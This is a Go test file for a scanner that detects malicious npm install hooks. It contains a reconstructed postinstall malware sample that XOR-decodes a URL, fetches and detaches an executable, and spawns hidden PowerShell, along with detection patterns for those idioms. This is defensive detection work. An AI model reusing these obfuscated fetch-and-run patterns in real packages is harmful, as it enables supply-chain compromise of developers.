package installsurface

import "testing"

// OPU-32 (BRIDGEHEAD, CloudSEK, Aug 2026): an npm install hook decoded its C2
// URL and PowerShell bridge with a hand-rolled XOR-over-fromCharCode loop
// (evading VC-002e's obfuscation markers, which only recognize base64/hex/
// gzip-family decodes and three specific fromCharCode-assembly shapes), and
// fetched-and-spawned in a JS-native async idiom (evading VC-002f's cradleRe,
// which only recognizes single-line shell/PowerShell pipe idioms). Both
// checks read the sample as a plain "declares a hook, hook reaches the
// network" — indistinguishable from a benign native-module installer. These
// tests lock the three new markers that close that gap.

// TestXorCharCodeDecodeDetected covers the XOR-over-fromCharCode idiom.
func TestXorCharCodeDecodeDetected(t *testing.T) {
	positives := []string{
		// The exact BRIDGEHEAD shape.
		`out += String.fromCharCode(bytes[i] ^ key.charCodeAt(i % key.length));`,
		// Minified / no-space variant.
		`String.fromCharCode(b[i]^k.charCodeAt(i%k.length))`,
		// Different variable names, same structural shape.
		`buf.push(String.fromCharCode(enc[idx] ^ secret.charCodeAt(idx % secret.length)))`,
	}
	for _, text := range positives {
		if !scanHasCap(text, CapObfuscation) {
			t.Errorf("expected CapObfuscation for %q", text)
		}
	}

	// A lone, incidental fromCharCode with no XOR must NOT match (this is
	// the exact esbuild-installer FP that D-25 already fixed for the
	// assembly-shape markers; xorCharCodeRe must not reintroduce it).
	negatives := []string{
		`String.fromCharCode(65)`,
		`const c = String.fromCharCode(code);`,
		// XOR present in the file but NOT inside the fromCharCode argument
		// list — e.g. an unrelated checksum a few lines away.
		`const chk = a ^ b; return String.fromCharCode(code);`,
	}
	for _, text := range negatives {
		if scanHasCap(text, CapObfuscation) {
			t.Errorf("did not expect CapObfuscation for %q", text)
		}
	}
}

// TestAsyncCradleDetected covers the JS-native fetch-then-exec idiom.
func TestAsyncCradleDetected(t *testing.T) {
	positives := []string{
		// The exact BRIDGEHEAD native-Windows branch shape.
		`https.get(url, () => { spawn(dest, [], { detached: true }); });`,
		`fetch(url).then(() => spawn(dest))`,
		`axios.get(remote, (r) => { execFile(localPath); })`,
	}
	for _, text := range positives {
		if !scanHasCap(text, CapCradle) {
			t.Errorf("expected CapCradle for %q", text)
		}
	}

	// esbuild's actual installer shape (Decision D-28's stated FP target):
	// fetch a prebuilt binary in one statement, run it as a SEPARATE later
	// statement. Must not match — the semicolon boundary should exclude it.
	negatives := []string{
		`await downloadPrebuiltBinary(url); chmodSync(binPath, 0o755); spawnSync(binPath);`,
		`https.get(manifestUrl, (res) => { console.log(res.statusCode); });`,
	}
	for _, text := range negatives {
		if scanHasCap(text, CapCradle) {
			t.Errorf("did not expect CapCradle for %q", text)
		}
	}
}

// TestDecodeThenInterpreterSpawnDetected covers BRIDGEHEAD's WSL branch: the
// actual fetch+run cradle exists only inside a PowerShell string assembled
// at runtime from decoded fragments, so it is never literal source text for
// any fetch-idiom regex to match. The co-occurrence of decode + spawning an
// interpreter is scored as the cradle signal instead.
func TestDecodeThenInterpreterSpawnDetected(t *testing.T) {
	bridgeheadWSLBranch := `
		function crossToWindows() {
		  const url = unpackSegment(ADDON_ENC, XOR_KEY);
		  const cmd = launcher + pre + url + post;
		  spawn('powershell.exe', ['-WindowStyle', 'Hidden', '-Command', cmd], { detached: true });
		}
		function unpackSegment(bytes, key) {
		  let out = '';
		  for (let i = 0; i < bytes.length; i++) {
		    out += String.fromCharCode(bytes[i] ^ key.charCodeAt(i % key.length));
		  }
		  return out;
		}
	`
	if !scanHasCap(bridgeheadWSLBranch, CapObfuscation) {
		t.Error("expected CapObfuscation (xor-charcode) on the shared decode function")
	}
	if !scanHasCap(bridgeheadWSLBranch, CapCradle) {
		t.Error("expected CapCradle (decode-then-interpreter-spawn) on the WSL branch")
	}

	// A spawned interpreter with NO obfuscation anywhere in the hook must not
	// score CapCradle on its own — e.g. a benign install hook that shells out
	// to powershell.exe to check the OS version.
	benign := `spawn('powershell.exe', ['-Command', 'Get-CimInstance Win32_OperatingSystem']);`
	if scanHasCap(benign, CapCradle) {
		t.Error("did not expect CapCradle for an interpreter spawn with no obfuscation present")
	}
}

// TestBridgeheadFullSampleEscalatesToBlockTier is an end-to-end regression:
// the full BRIDGEHEAD-pattern postinstall hook (both delivery branches, IOCs
// replaced with inert RFC 5737 / .invalid placeholders) must carry both
// CapObfuscation and CapCradle after this patch, where before it carried
// neither.
func TestBridgeheadFullSampleEscalatesToBlockTier(t *testing.T) {
	sample := `
'use strict';
const fs = require('fs');
const https = require('https');
const { spawn } = require('child_process');

const XOR_KEY = 'stf2026';
function unpackSegment(bytes, key) {
  let out = '';
  for (let i = 0; i < bytes.length; i++) {
    out += String.fromCharCode(bytes[i] ^ key.charCodeAt(i % key.length));
  }
  return out;
}
const ADDON_ENC = [27, 0, 18, 66, 67, 8, 25, 92];

function isVirtualizedLinux() {
  if (process.platform !== 'linux') return false;
  if (process.env.WSL_DISTRO_NAME || process.env.WSLENV) return true;
  const v = fs.readFileSync('/proc/version', 'utf8');
  return /microsoft/i.test(v);
}

function crossToWindows() {
  const url = unpackSegment(ADDON_ENC, XOR_KEY);
  spawn('powershell.exe', ['-WindowStyle', 'Hidden', '-Command', url], { detached: true, windowsHide: true });
}

function installNativeAddon() {
  const url = unpackSegment(ADDON_ENC, XOR_KEY);
  https.get(url, () => { spawn('main.exe', [], { detached: true }); });
}

if (process.platform === 'win32') {
  installNativeAddon();
} else if (isVirtualizedLinux()) {
  crossToWindows();
}
`
	caps, _ := scanCaps(sample)
	want := map[Capability]bool{CapObfuscation: false, CapCradle: false, CapExec: false, CapNetwork: false}
	for _, c := range caps {
		if _, ok := want[c]; ok {
			want[c] = true
		}
	}
	for cap, got := range want {
		if !got {
			t.Errorf("expected %s to be set on the full BRIDGEHEAD-pattern sample, was not", cap)
		}
	}
}

// TestAsyncCradleAgainstRealEsbuildFixture pins asyncCradleRe against the
// ACTUAL D-25/D-28 esbuild false positive (esbuild_regression_test.go), not a
// synthetic stand-in. The negatives shipped alongside asyncCradleRe use a
// downloadPrebuiltBinary(url) wrapper, which never reaches any of the four
// matched verbs (https.get/request, fetch, axios.get/post) — so those negatives
// pass trivially and don't actually exercise the same-statement/semicolon
// boundary the marker's own comment claims to rely on. This fixture does: it
// calls fetch(...) literally, with the exec (execFileSync) in a SEPARATE,
// LATER function — the real canonical "fetch here, run elsewhere" installer
// shape asyncCradleRe is designed to pass over.
func TestAsyncCradleAgainstRealEsbuildFixture(t *testing.T) {
	if scanHasCap(esbuildLikeInstallJS, CapCradle) {
		t.Error("the real esbuild install.js (fetch in one function, exec in a separate " +
			"later function) must NOT trigger CapCradle via asyncCradleRe")
	}
}
